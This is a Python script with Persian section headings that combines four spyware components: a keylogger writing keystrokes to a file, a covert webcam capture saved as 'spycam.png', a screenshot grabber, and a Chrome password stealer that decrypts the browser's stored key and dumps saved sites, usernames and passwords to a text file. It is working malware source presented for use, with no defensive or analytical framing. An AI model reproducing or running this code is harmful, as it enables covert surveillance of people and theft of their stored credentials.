# -----------------کی لاگر-------------
# pip install pynput
from pynput.keyboard import Listener, Key
from datetime import datetime, timedelta

special_keys = {"Key.space": "[Space]", "Key.enter": "[Enter]", "<98>": "2", "Key.tab": "[Tab]",
                "Key.ctrl_l": "[LCtrl]"}


def on_press(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]
    with open("kl.txt", "a") as f:
        f.write(listen)


start = datetime.now()
end = start + timedelta(seconds=10)


def on_release(key):
    if datetime.now() >= end:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# ----------------------وب کم---------------------
# pip install opencv-python
import cv2
camera = cv2.VideoCapture(0)
ret, frame = camera.read()
if ret:
     cv2.imwrite("spycam.png", frame)

camera.release()
cv2.destroyAllWindows()

# ----------------------اسکرین شات---------------------
# pip install pyautogui
import pyautogui
from time import sleep
my_screenshot = pyautogui.screenshot()
my_screenshot.save("screenshot.png")

# ----------------------پسورد های کروم---------------------
# pip install pycryptodomex
# pip install pypiwin32
import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Cryptodome.Cipher import AES


def pass_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        return  "No Passwords"



# به دست آوردن کلید
file_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Local State"
with open(file_path, "r", encoding="utf-8") as f:
    jn_data = f.read()
    py_data = json.loads(jn_data)

encryption_key = base64.b64decode(py_data["os_crypt"]["encrypted_key"])[5:]
key = win32crypt.CryptUnprotectData(encryption_key)[1]

# به دست آوردن رمز های ذخیره شدن
db_path = os.environ["USERPROFILE"] + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
file_name = "ch_pass.db"
shutil.copyfile(db_path, file_name)
db = sqlite3.connect(file_name)
cursor = db.cursor()
cursor.execute("select origin_url, action_url, username_value, password_value from logins order by date_last_used")
with open("ch_pass.txt", "w", encoding="utf-8") as pf:
    for row in cursor.fetchall():
        main_url = row[0]
        login_url = row[1]
        user_name = row[2]
        password = pass_decryption(row[3], key)
        if user_name or password:
            pf.write(f"main_url: {main_url}\n")
            pf.write(f"login_url: {login_url}\n")
            pf.write(f"user_name: {user_name}\n")
            pf.write(f"password: {password}\n")
            pf.write("-" * 40 + "\n")
cursor.close()
db.close()
os.remove(file_name)